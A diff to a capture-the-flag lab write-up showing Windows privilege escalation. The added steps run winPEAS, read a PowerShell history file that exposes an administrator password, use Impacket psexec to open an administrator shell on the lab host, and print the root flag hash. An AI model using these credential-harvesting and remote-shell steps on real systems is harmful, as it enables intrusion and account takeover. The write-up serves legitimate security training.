@@ -300,12 +300,75 @@ C:\Users\sql_svc\Downloads>
 
 Execute winPEAS on mssql server:
 ```shell
-C:\Users\sql_svc\Downloads>.\winPEASx64.exe
-.\winPEASx64.exe
+C:\Users\sql_svc\Downloads>powershell
+powershell
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\sql_svc\Downloads>.\winPEAS64.exe
+...
+...
+...
+ÉÍÍÍÍÍÍÍÍÍ͹ Analyzing Windows Files Files (limit 70)
+    C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+    C:\Users\Default\NTUSER.DAT
+    C:\Users\sql_svc\NTUSER.DAT
 ```
 
 From the output we can observer that we have SeImpersonatePrivilege (more information can be found [here](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), wich is also vulnerable to [juicy potato exploit](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato) 
 However, we can first check the two existing files where credential could be possible to be found.
 
+Check consoleHost_history.txt file and get credentials:
+```shell
+PS C:\Users\sql_svc\Downloads> cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
+cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
+PS C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> dir
+dir
 
+
+    Directory: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-ar---        3/17/2020   2:36 AM             79 ConsoleHost_history.txt                                               
+
+
+PS C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
+type ConsoleHost_history.txt
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+exit
+PS C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> 
+```
+
+We can now use the tool psexec.py again from the Impacket suite to get a shell as the administrator:
+```shell
+└─$ /usr/bin/impacket-psexec administrator@10.129.55.134
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on 10.129.55.134.....
+[*] Found writable share ADMIN$
+[*] Uploading file dJsQKqeR.exe
+[*] Opening SVCManager on 10.129.55.134.....
+[*] Creating service KSgs on 10.129.55.134.....
+[*] Starting service KSgs.....
+[!] Press help for extra shell commands                                                                    Microsoft Windows [Version 10.0.17763.2061]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> cd C:\Users\Administrator\Desktop                                                     
+C:\Users\Administrator\Desktop> dir                                                                         Volume in drive C has no label.
+ Volume Serial Number is 9565-0B4F
+
+ Directory of C:\Users\Administrator\Desktop
+
+07/27/2021  02:30 AM    <DIR>          .
+07/27/2021  02:30 AM    <DIR>          ..
+02/25/2020  07:36 AM                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  10,707,234,816 bytes free
+
+C:\Users\Administrator\Desktop> type root.txt                                                              b91ccec3305e98240082d4474b848528
+C:\Users\Administrator\Desktop> 
+```
 
